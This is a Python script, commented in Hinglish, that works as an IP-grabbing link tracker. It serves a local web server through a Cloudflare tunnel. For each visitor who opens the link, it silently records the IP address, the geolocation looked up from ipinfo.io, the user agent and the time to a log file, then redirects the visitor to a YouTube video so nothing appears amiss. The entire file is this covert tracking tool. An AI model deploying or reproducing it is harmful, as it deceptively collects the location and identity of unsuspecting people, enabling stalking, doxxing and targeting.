from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse as urlparse
import datetime
import requests
import json
import subprocess  # For running cloudflared commands

PORT = 4444  # Port number to run the server
LOG_FILE = "IP.txt"  # File where logs will be stored
YOUTUBE_URL = "https://www.youtube.com/watch?v=KXuE_DKLEHs"  # YouTube video URL to redirect to

# Function to log the user's information (IP, location, user agent)
def log_user_info(ip, user_agent):
    try:
        # Get geo info via IP API
        geo_req = requests.get(f"https://ipinfo.io/{ip}/json")  # IP API se location ki info lena
        geo_data = geo_req.json()  # JSON format mein response lena
        loc = geo_data.get("loc", "Unknown")  # Location ka data lena, agar na ho toh Unknown
        city = geo_data.get("city", "Unknown")  # City ka data lena
        country = geo_data.get("country", "Unknown")  # Country ka data lena
    except Exception as e:
        loc = city = country = "Error"  # Agar error aaye toh location, city, country ko "Error" set karna

    date = datetime.datetime.now().strftime("%a %d %b, %Y %I:%M %p")  # Current date aur time ko format karna
    with open(LOG_FILE, "a") as f:
        # File mein IP, location, user-agent aur date ko likhna
        f.write(f"IP: {ip} | Location: {loc} ({city}, {country}) | Agent: {user_agent} | Date: {date}\n")

# Main request handler
class MyHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Client IP address ko X-Forwarded-For header se lena, agar na ho toh default remote address
        client_ip = self.headers.get('X-Forwarded-For', self.client_address[0])  
        user_agent = self.headers.get('User-Agent', 'Unknown')  # User agent ko get karna

        # User ki info ko log karna
        log_user_info(client_ip, user_agent)

        # URL se query string parse karna
        parsed = urlparse.urlparse(self.path)
        query = urlparse.parse_qs(parsed.query)
        video_id = query.get('v', [None])[0]  # Agar video ID query mein di gayi ho toh use karna

        # Agar video ID diya gaya hai toh YouTube link pe redirect karna
        if video_id:
            self.send_response(302)  # 302 HTTP code for redirection
            self.send_header('Location', YOUTUBE_URL)  # YouTube URL pe redirect karna
            self.end_headers()
        else:
            # Agar video ID nahi diya gaya toh 200 OK response dena
            self.send_response(200)
            self.send_header('Content-type', 'text/html')  # HTML content type set karna
            self.end_headers()

            # Response body send karna jo user ko redirect karne ka message dikhayega
            self.wfile.write(f"""
                <html>
                <head>
                    <meta http-equiv="refresh" content="1;url={YOUTUBE_URL}">  <!-- 1 second mein redirect karna -->
                    <script>window.location.href="{YOUTUBE_URL}";</script>  <!-- JavaScript se redirect karna -->
                    <title>Redirecting...</title>
                </head>
                <body>
                    <h1>Redirecting to YouTube...</h1>
                    <p>If you are not redirected, click <a href="{YOUTUBE_URL}">here</a>.</p>
                </body>
                </html>
            """.encode())

# Cloudflare tunneling function
def start_cloudflare_tunnel():
    # Cloudflared command to start a tunnel
    cloudflared_command = ["cloudflared", "tunnel", "--url", f"http://localhost:{PORT}"]
    subprocess.Popen(cloudflared_command)  # Cloudflare tunnel ko run karna

# Run the server
if __name__ == '__main__':
    print(f"[+] Starting Python server on http://localhost:{PORT}")  # Server start hone ka message
    server_address = ('', PORT)  # Server address aur port set karna
    httpd = HTTPServer(server_address, MyHandler)  # HTTP server ko initialize karna
    # Start the Cloudflare tunnel in the background
    start_cloudflare_tunnel()  # Cloudflare tunnel ko start karna
    httpd.serve_forever()  # Server ko continuously run karte rakhna
